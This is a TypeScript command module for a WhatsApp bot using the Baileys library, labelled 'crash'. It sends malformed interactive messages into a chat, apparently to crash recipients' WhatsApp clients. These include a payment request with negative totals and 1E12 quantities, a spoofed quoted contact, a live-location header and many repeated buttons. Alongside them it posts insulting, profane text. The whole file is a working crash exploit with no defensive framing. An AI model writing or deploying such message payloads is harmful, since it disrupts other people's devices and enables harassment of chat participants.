
import { generateWAMessageFromContent, prepareWAMessageMedia, proto } from '@whiskeySockets/baileys'
import { client } from "../core"
import { getRandom, pickRandom } from "../lib/functions/functions"
import { MessageSerialize } from "../types"




export = {
    name: 'crash',
    aliases: ['crash'],
    description: 'esta madre crashea cosas',
    category: 'crasheadores',
    ownerOnly: true,
    handle: async (conn: client, m: MessageSerialize) => {
        const fcontact = {'key': {'participants': '0@s.whatsapp.net', 'remoteJid': 'status@broadcast', 'fromMe': false, 'id': getRandom(23)}, 'message': {'contactMessage': {'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.key.fromMe ? (conn.user.id.split(":")[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid).split('@')[0]}:${m.key.fromMe ? (conn.user.id.split(":")[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid).split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}, 'participant': '0@s.whatsapp.net'}
        const facts = ["toca el boton de abajo para ver los comandos", 'no tengo imaginacion', 'sabes que hacer', '/help', 'usa --help para ver el estado de un comando']
        let str =  `MI presentacion`

        
    

        const buttons = [{
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
        {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
                display_text: "CLICK ME",
                merchant_url: `https://wa.me/settings`,
                url: `https://wa.me/settings`,
            })
        },
    ]
    const images = ['https://i.pinimg.com/564x/11/46/fe/1146fe6e189dc73761726e566dff8197.jpg','https://i.pinimg.com/564x/ef/41/75/ef4175b23ebf5e287c4750cf242fe41c.jpg', 'https://i.pinimg.com/564x/eb/0a/44/eb0a449b2b781f8f90ad8db0b654f500.jpg', 'https://i.pinimg.com/564x/49/23/1b/49231bb54cc8b0162a3ba2642364fa8f.jpg']
                
        const Sbuttons = [
            {
                "name": "review_and_pay",
                "buttonParamsJson": JSON.stringify({
                    "currency": "MXN",
                    "total_amount": {
                        "value": -666610000000,
                        "offset": 100
                    },
                    "reference_id": "super skid bot md",
                    "type": "physical-goods",
                    "order": {
                        "status": "payment_requested",
                        "subtotal": {
                            "value": 10000000,
                            "offset": 100
                        },
                        "order_type": "ORDER",
                        "items": [
                            {
                                "retailer_id": "custom-item-b3489165-568b-4efb-a4cd-ef8290bb5de7",
                                "name": "bot",
                                "amount": {
                                    "value": -12123123100,
                                    "offset": 100
                                },
                                "quantity": 1E12
                            },
                            {
                                "retailer_id": "custom-item-b3489165-568b-4efb-a4cd-ef8290bb5de7",
                                "name": "bot",
                                "amount": {
                                    "value": -12123123100,
                                    "offset": 100
                                },
                                "quantity": 1E12
                            },
                        ]
                    },
                    "native_payment_methods": []
                })
            }
        ]

        const image = await prepareWAMessageMedia({
            image: {
                url: pickRandom(images),
            }
        }, {
            upload: conn.waUploadToServer,
        })
        

        const s = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: 'hola putos ya llego dios hijos de toda su puta madre imbeciles'
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'tets'
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            imageMessage: image.imageMessage,
                            hasMediaAttachment: true
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                           buttons: Sbuttons
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            
                        }
                    }),

                },
            },
            
        }, { userJid: m.sender, quoted:  fcontact})

        await conn.relayMessage(m.chat, s.message, { messageId: s.key.id })

        const dick = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: str
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'toca aqui'
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: 0,
                                name: 'test',
                                isLive: true,
                                url: 'https://wa.me/settings',
                                speedInMps: 0,
                                accuracyInMeters: 0,
                                address: 'test',
                            },
                            hasMediaAttachment: true
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            
                        }
                    }),

                },
            },
            
        }, { userJid: m.sender, quoted:  fcontact})

        await conn.relayMessage(m.chat, dick.message, { messageId: dick.key.id })
    }
    }

